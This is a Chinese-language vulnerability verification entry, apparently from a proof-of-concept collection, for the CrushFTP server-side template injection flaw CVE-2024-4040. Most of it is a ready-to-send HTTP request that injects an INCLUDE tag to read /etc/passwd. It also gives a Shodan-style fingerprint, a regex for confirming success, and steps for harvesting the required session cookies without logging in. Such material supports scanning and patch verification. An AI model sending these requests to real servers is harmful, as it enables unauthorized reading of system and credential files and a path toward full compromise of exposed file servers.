# CrushFTP 服务器端 模板注入漏洞

> 更新时间：2024-04-29

> 漏洞编号： CVE-2024-4040

> 漏洞说明：CrushFTP 是一个功能强大的跨平台文件传输服务器软件。它提供了安全、高性能的文件传输服务，支持多种文件传输协议，包括 FTP、FTPS、SFTP、HTTP、HTTPS 等。CrushFTP 提供了许多先进的功能和配置选项，使其成为企业和个人用户进行文件传输的理想选择。以下是一些 CrushFTP 的主要特点：多协议支持、安全性、跨平台、高性能、自定义配置。CrushFTP 在企业、教育机构、政府部门等许多领域被广泛应用，它提供了可靠、安全且易于使用的文件传输解决方案。其接口/WebInterface/function/存在模板注入漏洞，攻击者可通过该漏洞读取文件、控制系统等等。

> 漏洞特征：server="CrushFTP"

> 验证脚本：HTTP

```
GET /WebInterface/function/?command=zip&c2f=7HhJ&path=%3CINCLUDE%3E/etc/passwd%3C/INCLUDE%3E&names=* HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: currentAuth=7HhJ;CrushAuth=1714275533532_zx4ngKqwkGsIvlbmG8U3Tv0Q1r7HhJ

```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：CrushFTP 服务器端 模板注入漏洞.poc

```
备注说明：
1、获取cookie的双值
GET / HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close

响应：302，返回值：
Set-Cookie: currentAuth=G3fl;path=/
Set-Cookie: CrushAuth=1714284710416_zS8g6Qw1gDESrFY4tYfCJGSL5jG3fl; path=/;HttpOnly
```
